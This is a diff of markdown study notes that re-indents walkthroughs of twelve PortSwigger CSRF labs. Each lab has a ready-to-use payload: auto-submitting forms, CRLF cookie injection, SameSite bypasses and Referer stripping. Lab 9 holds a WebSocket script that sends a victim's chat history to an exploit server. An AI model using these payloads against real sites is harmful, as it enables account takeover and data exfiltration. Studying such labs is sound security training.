@@ -93,78 +93,78 @@ Cookie attributes to use: `Secure`, `HttpOnly`, `SameSite=Lax/Strict`, `Path`, `
 
 
 ## Labs
-* #Portswigger
-	1. **CSRF vulnerability with no defences** #APPRENTICE
-		*walkthrough :*
-		normal CSRF code with no challenges
-		*payload :* 
-		`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
-	2. **CSRF where token validation depends on request method** #PRACTITIONER
-		*walkthrough :*
-		it validates on the CSRF token only on the post method but when you change it to get method it does not validate the CSRF token
-		*payload :* 
-		`<form action="https://0a7100b5039066ec8a33af6800bc00f9.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@exploit-server.net"></form><script>document.forms[0].submit();</script>`
-	3. **CSRF where token validation depends on token being present** #PRACTITIONER
-		*walkthrough :*
-		it validates the CSRF token but if you delete it, it will accept the request
-		*payload :* 
-		`<form method="POST" action="https://0a5d003c0402913f80600da90086001b.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@123.com"></form><script>document.forms[0].submit();</script>`
-	4. **CSRF where token is not tied to user session** #PRACTITIONER
-		*walkthrough :*
-		it validates the CSRF token but it is not connected to the session so I open two accounts and steal the token from one of them and add it to the another account and the server check for the token and accept it
-		*payload :* 
-		`<form method="POST" action="https://0aab00b103ec4568830796af0038003b.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@51.com"><input type="hidden" name="csrf" value="uPEhoHrG1znn2YV2TVpaOtrgA7eE5RCf"></form><script>document.forms[0].submit();</script>`
-	5. **CSRF where token is tied to non-session cookie** #PRACTITIONER
-		*walkthrough :*
-		it validates the CSRF token which connected to the CSRF key so I open two accounts and steal the two parameters from one of them and add it to the another account and inject the http header to add the CSRF key into the header using the search functionality and the server accept it
-		*payload :* 
-		`<form method="POST" action="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@123.com"><input type="hidden" name="csrf" value="waIBURgmMDfCfhPVwXogfv0nYrly3r12"></form><img src="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=uK2u175yjgFOM1AsZJJAeLhiuJFdPUc1%3b%20SameSite=None" onerror="document.forms[0].submit()">`
-	6. **CSRF where token is duplicated in cookie** #PRACTITIONER
-		*walkthrough :*
-		it validates that the two CSRF must be the same so you can manipulate them both to exploit the CSRF using search function to over right the cookies of the user with any value and add the same value to the delivered script
-		*payload :* 
-		`<form method="POST" action="https://0a0e006a04a362af839d0005009f00d2.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@2.com"><input type="hidden" name="csrf" value="fake"></form><img src="https://0a0e006a04a362af839d0005009f00d2.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
-	7. **SameSite Lax bypass via method override** #PRACTITIONER
-		*walkthrough :*
-		the mitigation here is `SameSite` header which set automatically to LAX so in LAX it passes GET request and top-level navigation so we spoofed our method using this payload => **Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes - Why Symfony does this?
-		Because HTML forms can’t send anything except GET & POST** which we will use to solve this lab
-		*payload :* 
-		`<script>document.location = "https://0a160052043c878e81f3b2f2005700db.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";</script>`
-	8. **SameSite Strict bypass via client-side redirect** #PRACTITIONER
-		*walkthrough :*
-		to solve this lab after knowing that the `SameSite` header is set to strict you should try to find open redirection and we found it on this path `/post/comment/confirmation?postId=1` and apply this
-		*payload :* 
-		`<script>document.location = "https://0a8000010429372d82b575ab00a00092.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";</script>`
-	9. **SameSite Strict bypass via sibling domain** #PRACTITIONER
-		*walkthrough :*
-		I found that if I send READY message to the web socket I will receive the chat history so I create a code that do this job and extract the message in BASE64 encoded :
-		`<script>
-		`var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');` `ws.onopen = function(evt) { ws.send("READY"); };`
-		`ws.onmessage = function(evt) {`
-		`var message = evt.data`
-		`fetch('https://exploit-server/exploit?message=' + btoa(message))`
-		`</script>`
-		then I delivered the payload but I got no chat history because the browser did not include the cookies of the victim in the request (same site = strict) so I found another subdomain (same site) that vulnerable to XSS so i inject same payload but URL-Encoded and create new code that encapsulate the older one as a username parameter which vulnerable to XSS :
-		`<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=OLDER-CODE&password=anything"; </script>`
-	10. **SameSite Lax bypass via cookie refresh** #PRACTITIONER
-		*walkthrough :*
-		this an OAuth authentication and have no CSRF token but have LAX samesite so we will send normal CSRF request and change the email using first exploit {arrow|#ff0035|9} If you logged in less than two minutes ago, the attack is successful and your email address is changed but If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately, notice that if you visit `/social-login`, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction so we will change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. {arr|#3595da|6} Observe that the initial request gets blocked by the browser's popup blocker. Realize that the popup is being blocked because you haven't manually interacted with the page. Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked {arro|#ecebeb|3}
-		*payload :* 
-		First : {arrow}
-		`<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"> <input type="hidden" name="email" value="foo@bar.com" /> <input type="submit" value="Submit request" /> </form> <script> document.forms[0].submit(); </script>`
-		Second : {arr}
-		`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@web-security-academy.net"> </form> <script> window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); function changeEmail(){ document.forms[0].submit(); } </script>`
-		Third : {arro}
-		`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>`
-	11. **CSRF where Referrer validation depends on header being present** #PRACTITIONER
-		*Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted. In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack*
-		it is a normal CSRF it validates the referrer header but if you delete it then the request will pass with no referrer header so you will use this code on the head tag to delete the header `<meta name="referrer" content="no-referrer">` 
-		*payload :* 
-		`<form method="POST"action="https://0a2e006b033f11cc830b1aee00d000ce.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@100.com"></form><script>document.forms[0].submit();</script>`
-	12. **CSRF with broken Referrer validation** #PRACTITIONER {my-arrow}
-		we found that if we change the referrer header into `https://any-domain.com/?the-original-domain` the request will sent so we will sent the `pushState(state,title,URL)` function which append the URL to the  original domain on the action
-		*payload :* 
-		`<form method="POST" action="https://0ac200e304c17082822eb5e50004001f.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@4010.com"></form><script>history.pushState("", "", "/?0ac200e304c17082822eb5e50004001f.web-security-academy.net")document.forms[0].submit();</script>`
+#Portswigger
+1. **CSRF vulnerability with no defences** #APPRENTICE
+	*walkthrough :*
+	normal CSRF code with no challenges
+	*payload :* 
+	`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="anything%40web-security-academy.net"> </form> <script> document.forms[0].submit(); </script>`
+2. **CSRF where token validation depends on request method** #PRACTITIONER
+	*walkthrough :*
+	it validates on the CSRF token only on the post method but when you change it to get method it does not validate the CSRF token
+	*payload :* 
+	`<form action="https://0a7100b5039066ec8a33af6800bc00f9.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@exploit-server.net"></form><script>document.forms[0].submit();</script>`
+3. **CSRF where token validation depends on token being present** #PRACTITIONER
+	*walkthrough :*
+	it validates the CSRF token but if you delete it, it will accept the request
+	*payload :* 
+	`<form method="POST" action="https://0a5d003c0402913f80600da90086001b.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@123.com"></form><script>document.forms[0].submit();</script>`
+4. **CSRF where token is not tied to user session** #PRACTITIONER
+	*walkthrough :*
+	it validates the CSRF token but it is not connected to the session so I open two accounts and steal the token from one of them and add it to the another account and the server check for the token and accept it
+	*payload :* 
+	`<form method="POST" action="https://0aab00b103ec4568830796af0038003b.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@51.com"><input type="hidden" name="csrf" value="uPEhoHrG1znn2YV2TVpaOtrgA7eE5RCf"></form><script>document.forms[0].submit();</script>`
+5. **CSRF where token is tied to non-session cookie** #PRACTITIONER
+	*walkthrough :*
+	it validates the CSRF token which connected to the CSRF key so I open two accounts and steal the two parameters from one of them and add it to the another account and inject the http header to add the CSRF key into the header using the search functionality and the server accept it
+	*payload :* 
+	`<form method="POST" action="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@123.com"><input type="hidden" name="csrf" value="waIBURgmMDfCfhPVwXogfv0nYrly3r12"></form><img src="https://0a98008e04b4bc7f868f7501008b002c.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=uK2u175yjgFOM1AsZJJAeLhiuJFdPUc1%3b%20SameSite=None" onerror="document.forms[0].submit()">`
+6. **CSRF where token is duplicated in cookie** #PRACTITIONER
+	*walkthrough :*
+	it validates that the two CSRF must be the same so you can manipulate them both to exploit the CSRF using search function to over right the cookies of the user with any value and add the same value to the delivered script
+	*payload :* 
+	`<form method="POST" action="https://0a0e006a04a362af839d0005009f00d2.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@2.com"><input type="hidden" name="csrf" value="fake"></form><img src="https://0a0e006a04a362af839d0005009f00d2.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>`
+7. **SameSite Lax bypass via method override** #PRACTITIONER
+	*walkthrough :*
+	the mitigation here is `SameSite` header which set automatically to LAX so in LAX it passes GET request and top-level navigation so we spoofed our method using this payload => **Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes - Why Symfony does this?
+	Because HTML forms can’t send anything except GET & POST** which we will use to solve this lab
+	*payload :* 
+	`<script>document.location = "https://0a160052043c878e81f3b2f2005700db.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";</script>`
+8. **SameSite Strict bypass via client-side redirect** #PRACTITIONER
+	*walkthrough :*
+	to solve this lab after knowing that the `SameSite` header is set to strict you should try to find open redirection and we found it on this path `/post/comment/confirmation?postId=1` and apply this
+	*payload :* 
+	`<script>document.location = "https://0a8000010429372d82b575ab00a00092.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";</script>`
+9. **SameSite Strict bypass via sibling domain** #PRACTITIONER
+	*walkthrough :*
+	I found that if I send READY message to the web socket I will receive the chat history so I create a code that do this job and extract the message in BASE64 encoded :
+	`<script>
+	`var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');` `ws.onopen = function(evt) { ws.send("READY"); };`
+	`ws.onmessage = function(evt) {`
+	`var message = evt.data`
+	`fetch('https://exploit-server/exploit?message=' + btoa(message))`
+	`</script>`
+	then I delivered the payload but I got no chat history because the browser did not include the cookies of the victim in the request (same site = strict) so I found another subdomain (same site) that vulnerable to XSS so i inject same payload but URL-Encoded and create new code that encapsulate the older one as a username parameter which vulnerable to XSS :
+	`<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=OLDER-CODE&password=anything"; </script>`
+10. **SameSite Lax bypass via cookie refresh** #PRACTITIONER
+	*walkthrough :*
+	this an OAuth authentication and have no CSRF token but have LAX samesite so we will send normal CSRF request and change the email using first exploit {arrow|#ff0035|9} If you logged in less than two minutes ago, the attack is successful and your email address is changed but If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately, notice that if you visit `/social-login`, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction so we will change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause. {arr|#3595da|6} Observe that the initial request gets blocked by the browser's popup blocker. Realize that the popup is being blocked because you haven't manually interacted with the page. Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked {arro|#ecebeb|3}
+	*payload :* 
+	First : {arrow}
+	`<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST"> <input type="hidden" name="email" value="foo@bar.com" /> <input type="submit" value="Submit request" /> </form> <script> document.forms[0].submit(); </script>`
+	Second : {arr}
+	`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@web-security-academy.net"> </form> <script> window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); function changeEmail(){ document.forms[0].submit(); } </script>`
+	Third : {arro}
+	`<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form> <p>Click anywhere on the page</p> <script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } </script>`
+11. **CSRF where Referrer validation depends on header being present** #PRACTITIONER
+	*Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted. In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack*
+	it is a normal CSRF it validates the referrer header but if you delete it then the request will pass with no referrer header so you will use this code on the head tag to delete the header `<meta name="referrer" content="no-referrer">` 
+	*payload :* 
+	`<form method="POST"action="https://0a2e006b033f11cc830b1aee00d000ce.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@100.com"></form><script>document.forms[0].submit();</script>`
+12. **CSRF with broken Referrer validation** #PRACTITIONER {my-arrow}
+	we found that if we change the referrer header into `https://any-domain.com/?the-original-domain` the request will sent so we will sent the `pushState(state,title,URL)` function which append the URL to the  original domain on the action
+	*payload :* 
+	`<form method="POST" action="https://0ac200e304c17082822eb5e50004001f.web-security-academy.net/my-account/change-email"><input type="hidden" name="email" value="adel@4010.com"></form><script>history.pushState("", "", "/?0ac200e304c17082822eb5e50004001f.web-security-academy.net")document.forms[0].submit();</script>`
 ---
 # Common defenses against CSRF
 > using a perfect solution does not mean it has a perfect implementation 
